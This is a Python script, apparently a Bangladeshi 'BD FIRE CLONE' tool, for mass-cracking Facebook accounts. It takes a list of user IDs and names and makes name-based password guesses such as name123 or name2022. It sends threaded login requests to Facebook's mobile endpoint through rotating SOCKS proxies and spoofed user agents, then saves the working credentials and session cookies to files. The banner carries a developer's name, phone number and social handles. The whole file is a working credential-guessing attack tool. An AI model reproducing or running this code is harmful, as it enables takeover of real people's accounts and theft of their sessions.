	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[NOOB')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _AKASH_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"""
                                    

 ________  ___  _____   _  __
/_  __/ / / / |/ / _ | / |/ /
 / / / /_/ /    / __ |/    / 
/_/  \____/_/|_/_/ |_/_/|_/  
                                                         
 \033[1;32m┌──────────────────────────────────────────────┐
\033[1;32m │\33[37;41m\t     BD FIRE    CLONE VERSION 2.0      \33[0;m  │
 \033[1;32m└──────────────────────────────────────────────┘
 
 \033[1;32m┌────────────────────────────────────────────────┐
 \033[1;32m│\033[1;31m➣\033[1;91m DEVELOPMENT     \033[1;31m:\033[1;32m SHEIKH TUNAN UDDIN
 \033[1;32m│\033[1;31m➣\033[1;32m FACEBOOK        \033[1;31m:\033[1;32m Sk. Safiuddin
 \033[1;32m│\033[1;31m➣\033[1;91m WHATSAPP        \033[1;31m:\033[1;32m 01887074682
 \033[1;32m│\033[1;31m➣\033[1;32m GITHUB          \033[1;31m:\033[1;32m ITS-TUNAN
 \033[1;32m└────────────────────────────────────────────────┘  """)
os.system('clear')
banner()
#os.system("play-audio ASSALAMUALAIKUM_WELCOME_TO_NOOB_WORLD.mp3")
print(f' {dt}\033[1;32mWHAT IS YOUR NAME\033[1;37m')
AKASH_NAME=input(f' {dt}YOUR NAME \033[1;37m ')
#--------------------[ BAGIAN-MASUK ]--------------#


#------------------[ BAGIAN-MENU ]----------------#
def menu():
	
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	_AKASH_(f'\x1b[1;91m┏────────────────────────┓')
	_AKASH_(f'\x1b[1;91m│\033[47m\033[1;30m USER INFORMATION\033[40m\033[00m\x1b[1;91m       │')
	_AKASH_(f'\x1b[1;91m┠─────────────┯──────────┛')
	_AKASH_(f'\x1b[1;91m│\x1b[1;92mYOUR NAME\x1b[1;91m────╂➣\x1b[1;92m '+str(AKASH_NAME))
	_AKASH_(f'\x1b[1;91m│\x1b[1;92mYOUR ID NAME\x1b[1;91m─╂➣\x1b[1;92m ')
	_AKASH_(f'\x1b[1;91m│\x1b[1;92mCLONING DATE\x1b[1;91m─╂➣ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta}')
	_AKASH_(f"\x1b[1;91m│\x1b[1;92mCLONING TIME\x1b[1;91m─╂➣ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	_AKASH_(f'\x1b[1;91m│\x1b[1;92mYOUR ID\x1b[1;91m──────╂➣\x1b[1;92m ')
	_AKASH_(f'\x1b[1;91m│\x1b[1;92mYOUR IP\x1b[1;91m──────╂➣ \x1b[1;92m{ip}')
	_AKASH_(f'\x1b[1;91m┗─────────────┛')
	_AKASH_(f'{dt}{I} \033[47m\033[1;34m  MAIN MENU  \033[40m\033[00m')
	_AKASH_(f'\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m FILE CRACK')
	_AKASH_(f'\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m CONTACT ME')
	_AKASH_(f'\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;91m EXIT')
	_____AKASH_____ = input(f'{dt}{I}Choose {Q}')
	if _____AKASH_____ in ['1']:
		#os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		F()
	if _____AKASH_____ in ['2']:
		#os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		os.system("xdg-open https://www.facebook.com/profile.php?id=100053264861913")
	if _____AKASH_____ in ['0']:
		os.system('exit')
		exit()
	else:
		print(' {dt}Successful Bra 😄 ')
		back()
def error():
	print(f' {dt}\033[1;92mSORRY, PLZ CHOOSE THE RIGHT MENU')
	time.sleep(2)
	back()
	

#-------------[ CRACK-FROM-FILE ]------------------#
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			print(f' {dt}{I}   Example: /sdcard/AKASH.txt     {Q}')
			fileX = input (f' {dt}{I}   ENTER YOUR FILE > {Q}') 
			os.system('clear')
			banner()
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f' {dt}{I}TOTAL ID >> \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print(f" {dt}{I}FILE %s NOT FOUND\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	
	hu = '1'
	if hu in ['0','00']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f' {dt}{I} WRONG CHOICE...!')
		exit()
	
	
	hc = "1"
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
  
	print(f' {dt}----------------------------------------------')
	print(f"\x1b[1;91m {dt} \x1b[1;92mYOUR NAME         \x1b[1;92m"+str(AKASH_NAME))
	print(f"\x1b[1;91m {dt} \x1b[1;92mTOTAL ID          "+str(len(id)))
	print(f"\x1b[1;91m {dt} \x1b[1;92mTODAY TIME        \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	print(f"\x1b[1;91m {dt} \x1b[1;92mTODAY DATE        \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	print(f" {dt} {I}NOTE \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")
	print(f' {dt}----------------------------------------------')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'@@')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f' {dt}{I} CRACK COMPLETE ')
	print(f' {dt} {I} TOTAL OK : {h}%s '%(ok))
	print(f'{dt}{I}Main Manu \x1b[1;92m[Y]\n \x1b[1;91m\x1b[1;91mExit [T]')
	woi = input(f' {dt}{I}Choose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'{dt}{I}Allah Hafiz Bro {u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [NOOB] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(noob)
	ua2 = random.choice(noob2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=618974734879191&kid_directed_site=0&app_id=618974734879191&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D618974734879191%26cbt%3D1676043435223%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df30117243c7bec%2526domain%253Dteenpattigold.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fteenpattigold.com%25252Ff279db02fef3abc%2526relation%253Dopener%26client_id%3D618974734879191%26display%3Dtouch%26domain%3Dteenpattigold.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fteenpattigold.com%252F%26locale%3Den_US%26logger_id%3Df2f27a16e08cb04%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3bf89c24c3948%2526domain%253Dteenpattigold.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fteenpattigold.com%25252Ff279db02fef3abc%2526relation%253Dopener%2526frame%253Df23e7c188c6c05%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3bf89c24c3948%26domain%3Dteenpattigold.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fteenpattigold.com%252Ff279db02fef3abc%26relation%3Dopener%26frame%3Df23e7c188c6c05%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=618974734879191&auth_token=00e3002825e34140ef1c826deabf0dbd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D618974734879191%26cbt%3D1676043435223%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df30117243c7bec%2526domain%253Dteenpattigold.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fteenpattigold.com%25252Ff279db02fef3abc%2526relation%253Dopener%26client_id%3D618974734879191%26display%3Dtouch%26domain%3Dteenpattigold.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fteenpattigold.com%252F%26locale%3Den_US%26logger_id%3Df2f27a16e08cb04%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3bf89c24c3948%2526domain%253Dteenpattigold.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fteenpattigold.com%25252Ff279db02fef3abc%2526relation%253Dopener%2526frame%253Df23e7c188c6c05%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=618974734879191&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3bf89c24c3948%26domain%3Dteenpattigold.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fteenpattigold.com%252Ff279db02fef3abc%26relation%3Dopener%26frame%3Df23e7c188c6c05%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=en_GB&refid=9',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;93m[NOOB-CP] {idf} | {pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n [TUNAN-OK] [💚] {idf} | {pw}\n {dt}{I}COOKIES {kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('DUMP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    menu()

